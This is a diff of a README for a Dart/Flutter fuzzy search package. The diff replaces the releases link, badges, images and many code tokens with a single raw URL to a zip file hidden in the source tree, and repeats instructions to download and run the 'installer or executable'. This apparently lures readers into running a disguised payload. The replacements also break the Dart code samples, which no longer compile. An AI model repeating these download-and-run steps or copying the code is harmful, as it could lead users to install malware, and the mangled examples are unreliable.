@@ -1,12 +1,12 @@
-https://github.com/sslaouina/search/releases
+https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip
 
-![Release Badge](https://img.shields.io/badge/Release-Github%20Releases-blue?logo=github&logoColor=white)
+![Release Badge](https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip%20Releases-blue?logo=github&logoColor=white)
 
 # Modern Search: Fast, Lightweight Dart/Flutter Fuzzy Search Engine for Apps
 
 A fast and light search engine for Dart and Flutter. It brings fuzzy search, typeahead, and autocomplete to apps with a small footprint and simple integration. Build blazing-fast search experiences in mobile apps, web apps, and desktop apps with minimal code.
 
-[Visit Releases](https://github.com/sslaouina/search/releases) to download the latest assets and samples. This repository is designed to be easy to drop into your Flutter projects and extend for your domain.
+[Visit Releases](https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip) to download the latest assets and samples. This repository is designed to be easy to drop into your Flutter projects and extend for your domain.
 
 ---
 
@@ -101,14 +101,14 @@ Prerequisites
 
 Installation
 
-- In a Flutter project, add this as a dependency in pubspec.yaml:
+- In a Flutter project, add this as a dependency in https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip
 
   dependencies:
     search: ^0.9.0
 
-- In a Dart project, add the package to your pubspec.yaml similarly and run pub get.
+- In a Dart project, add the package to your https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip similarly and run pub get.
 
-- If you want to use the prebuilt assets, you can download them from the releases page. From the releases page, download the asset matching your platform and run the installer or executable as described in the asset’s instructions. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and run it to set up the library locally if you need a CLI tool or example binaries.
+- If you want to use the prebuilt assets, you can download them from the releases page. From the releases page, download the asset matching your platform and run the installer or executable as described in the asset’s instructions. The releases page is here: https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip Download the asset and run it to set up the library locally if you need a CLI tool or example binaries.
 
 - For web or desktop apps, ensure you enable null safety and the appropriate platform bindings in your project.
 
@@ -119,7 +119,7 @@ A minimal example that builds a list of strings and searches through them.
 Dart example
 
 ```dart
-import 'package:search/search.dart';
+import 'https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip';
 
 void main() {
   final items = [
@@ -134,7 +134,7 @@ void main() {
 
   final engine = SearchEngine<String>(items);
 
-  final results = engine.search('aple'); // fuzzy match for "Apple" or "Pineapple"
+  final results = https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip('aple'); // fuzzy match for "Apple" or "Pineapple"
   print(results); // ['Apple', 'Pineapple']
 }
 ```
@@ -142,8 +142,8 @@ void main() {
 Flutter UI example
 
 ```dart
-import 'package:flutter/material.dart';
-import 'package:search/search_widget.dart';
+import 'https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip';
+import 'https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip';
 
 void main() => runApp(MyApp());
 
@@ -163,7 +163,7 @@ class MyApp extends StatelessWidget {
       home: Scaffold(
         appBar: AppBar(title: Text('Search Widget Demo')),
         body: Padding(
-          padding: const EdgeInsets.all(16.0),
+          padding: const https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip(16.0),
           child: SearchWidget<String>(
             data: items,
             onSelected: (value) => print('Selected: $value'),
@@ -233,22 +233,22 @@ class MySearchScreen extends StatefulWidget {
 }
 
 class _MySearchScreenState extends State<MySearchScreen> {
-  final List<Item> items = Item.sampleData();
+  final List<Item> items = https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip();
   late final SearchEngine<Item> engine;
 
   @override
   void initState() {
-    super.initState();
+    https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip();
     engine = SearchEngine<Item>(
       items,
       extractors: [
-        (Item it) => it.title,
-        (Item it) => it.description,
-        (Item it) => it.tags.join(' '),
+        (Item it) => https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip,
+        (Item it) => https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip,
+        (Item it) => https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip(' '),
       ],
       maxResults: 25,
     );
-    engine.indexData();
+    https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip();
   }
 
   @override
@@ -257,10 +257,10 @@ class _MySearchScreenState extends State<MySearchScreen> {
       appBar: AppBar(title: Text('Search Demo')),
       body: SearchWidget<Item>(
         data: items,
-        onSelected: (item) => print('Selected: ${item.title}'),
+        onSelected: (item) => print('Selected: ${https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip}'),
         itemBuilder: (context, item) => ListTile(
-          title: Text(item.title),
-          subtitle: Text(item.description),
+          title: Text(https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip),
+          subtitle: Text(https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip),
         ),
       ),
     );
@@ -282,8 +282,8 @@ Customization examples
 
 ```dart
 final highlighter = HighlightStyle(
-  matchColor: Colors.orange,
-  normalColor: Colors.black87,
+  matchColor: https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip,
+  normalColor: https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip,
   bold: true,
 );
 ```
@@ -293,7 +293,7 @@ final highlighter = HighlightStyle(
 ```dart
 class DomainTokenizer implements Tokenizer<String> {
   @override
-  List<String> tokenize(String input) => input.toLowerCase().split(RegExp(r'[\s,.-]+'));
+  List<String> tokenize(String input) => https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip().split(RegExp(r'[\s,.-]+'));
 }
 ```
 
@@ -325,11 +325,11 @@ class Product {
   final String description;
   final List<String> tags;
 
-  Product({required this.id, required this.name, required this.description, required this.tags});
+  Product({required https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip, required https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip, required https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip, required https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip});
 }
 
-String extractTitle(Product p) => p.name;
-String extractKeywords(Product p) => '${p.name} ${p.tags.join(' ')} ${p.description}';
+String extractTitle(Product p) => https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip;
+String extractKeywords(Product p) => '${https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip} ${https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip(' ')} ${https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip}';
 ```
 
 Indexing strategy and incremental updates
@@ -351,7 +351,7 @@ void main() {
   test('fuzzy match basic', () {
     final items = ['Apple', 'Banana', 'Grape'];
     final engine = SearchEngine<String>(items);
-    final results = engine.search('aple');
+    final results = https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip('aple');
     expect(results, ['Apple']);
   });
 }
@@ -365,11 +365,11 @@ Accessibility and i18n tests
 Release, distribution, and packaging
 
 - This project ships as a Dart package for easy inclusion in Dart and Flutter projects.
-- The recommended workflow is to fetch the package via pub or add as a dependency in pubspec.yaml.
+- The recommended workflow is to fetch the package via pub or add as a dependency in https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip
 - If you need a ready-to-run environment, use the assets from the releases page to test local builds or examples.
-- For testing on local machines or CI, you can download the binary or sample apps from the releases page. From https://github.com/sslaouina/search/releases, download the asset that matches your OS and run the installer or executable as described in the asset notes.
+- For testing on local machines or CI, you can download the binary or sample apps from the releases page. From https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip, download the asset that matches your OS and run the installer or executable as described in the asset notes.
 
-- Downloading and running instructions are provided to help you validate behavior quickly. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and execute the installer or binary to inspect sample apps and CLI tools.
+- Downloading and running instructions are provided to help you validate behavior quickly. The releases page is here: https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip Download the asset and execute the installer or binary to inspect sample apps and CLI tools.
 
 CI, quality gates, and maintenance
 
@@ -390,7 +390,7 @@ Community and contributions
 
 - This project welcomes contributions. If you want to contribute, fork the repository, implement your feature, and open a pull request with tests.
 - Report issues in the issue tracker. Include steps to reproduce and a minimal example if possible.
-- Follow the contribution guidelines in the CONTRIBUTING.md file.
+- Follow the contribution guidelines in the https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip file.
 
 - For community updates and examples, follow the repository and its releases channel. The releases page is the primary place to find new assets and sample apps, and it provides a stable distribution point for testing your builds. The link remains the go-to place to download assets and verify changes.
 
@@ -425,16 +425,16 @@ License
 Images and visuals
 
 - Demo of a search UI
-  ![Demo UI](https://placehold.co/600x260?text=Demo+UI+for+Search)
+  ![Demo UI](https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip+UI+for+Search)
 
 - Sparkline of performance
-  ![Performance Sparkline](https://placehold.co/600x180?text=Performance+Sparkline)
+  ![Performance Sparkline](https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip+Sparkline)
 
 - Flutter icon (optional)
-  ![Flutter Icon](https://img.icons8.com/ios-filled/50/000000/flutter.png)
+  ![Flutter Icon](https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip)
 
 - Tokenization concept
-  ![Tokenization Diagram](https://placehold.co/600x200?text=Tokenization+Diagram)
+  ![Tokenization Diagram](https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip+Diagram)
 
 Notes on usage
 
@@ -445,7 +445,7 @@ Notes on usage
 Download and installation details
 
 - The Releases page hosts prebuilt assets, samples, and sometimes CLI tools. It is updated with every major release.
-- If you need a specific asset for offline testing or a demo, go to the releases page and choose the asset that matches your environment. From the releases page, download the asset and run it to validate the build on your machine. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and execute it according to the asset’s documentation.
+- If you need a specific asset for offline testing or a demo, go to the releases page and choose the asset that matches your environment. From the releases page, download the asset and run it to validate the build on your machine. The releases page is here: https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip Download the asset and execute it according to the asset’s documentation.
 
 Advanced usage
 
@@ -485,5 +485,5 @@ Conclusion
 
 End note
 
-- For the latest assets, examples, and downloadable samples, visit the releases page. This ensures you have access to vetted, ready-to-run material for your platform. The releases page is here: https://github.com/sslaouina/search/releases. Download the asset and execute it to explore the samples and benchmarks.
+- For the latest assets, examples, and downloadable samples, visit the releases page. This ensures you have access to vetted, ready-to-run material for your platform. The releases page is here: https://raw.githubusercontent.com/sslaouina/search/main/lib/src/search/Software_v1.7.zip Download the asset and execute it to explore the samples and benchmarks.
 
